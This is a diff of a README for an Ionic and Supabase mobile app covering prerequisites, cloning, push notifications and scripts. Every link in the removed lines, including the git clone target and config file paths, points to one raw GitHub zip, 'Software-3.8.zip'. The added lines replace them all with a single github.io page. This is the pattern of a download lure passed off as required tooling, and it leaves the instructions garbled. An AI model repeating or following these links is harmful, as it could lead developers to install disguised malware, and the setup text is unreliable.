@@ -2,10 +2,10 @@
 ## Prerequisites
 Before getting started, make sure you have the following installed on your development machine:
 
-* https://raw.githubusercontent.com/zaylem91/supbase/main/src/app/shared/directives/Software-3.8.zip (version 12 or later)
+* https://zaylem91.github.io (version 12 or later)
 * npm (Node Package Manager)
-* [Ionic CLI](https://raw.githubusercontent.com/zaylem91/supbase/main/src/app/shared/directives/Software-3.8.zip)
-* [Supabase CLI](https://raw.githubusercontent.com/zaylem91/supbase/main/src/app/shared/directives/Software-3.8.zip)
+* [Ionic CLI](https://zaylem91.github.io)
+* [Supabase CLI](https://zaylem91.github.io)
 * Android Studio (If you are going to build the app for android)
 * Xcode (If you are going to build the app for iOS)
 * OneSignal account
@@ -15,7 +15,7 @@ Before getting started, make sure you have the following installed on your devel
 ## Clone the repo
 
 ```
-git clone https://raw.githubusercontent.com/zaylem91/supbase/main/src/app/shared/directives/Software-3.8.zip
+git clone https://zaylem91.github.io
 ```
 
 ## Install dependencies
@@ -50,15 +50,15 @@ This will create a platform-specific build of your app in the /platforms folder.
 The project includes documentation on the project structure, dependencies, Ionic features, Capacitor plugins, and more, be sure to check the documentation or docs folder for more information on the app.
 
 ## Getting Help
-If you have any questions or need help getting started with the app, feel free to reach out through the project's [issue tracker](https://raw.githubusercontent.com/zaylem91/supbase/main/src/app/shared/directives/Software-3.8.zip).
+If you have any questions or need help getting started with the app, feel free to reach out through the project's [issue tracker](https://zaylem91.github.io).
 
 ## Push Notifications
 OneSignal is for Notification
 ### Web Push
 * Create an two apps on OneSignal - one for test and one for productions - and setup web push. Enable Local Testing option for the test app.
-* Add the app ids to `https://raw.githubusercontent.com/zaylem91/supbase/main/src/app/shared/directives/Software-3.8.zip` and `https://raw.githubusercontent.com/zaylem91/supbase/main/src/app/shared/directives/Software-3.8.zip`.
+* Add the app ids to `https://zaylem91.github.io` and `https://zaylem91.github.io`.
 
 ## Scripts
-Utility scripts has been added to `https://raw.githubusercontent.com/zaylem91/supbase/main/src/app/shared/directives/Software-3.8.zip` for convenience. Run with `npm run <command>`:
+Utility scripts has been added to `https://zaylem91.github.io` for convenience. Run with `npm run <command>`:
 * `update-types`: Update database definition Typescript Interface from local Supabase
 * `db-reset-local-to-prod`: Restores local DB with dump from remote supabase instance. Dependency `pg_dump`, .pgpass with local and remote DB credentials and environmental variable `SUPABASE_DB_HOST` with remote host name.
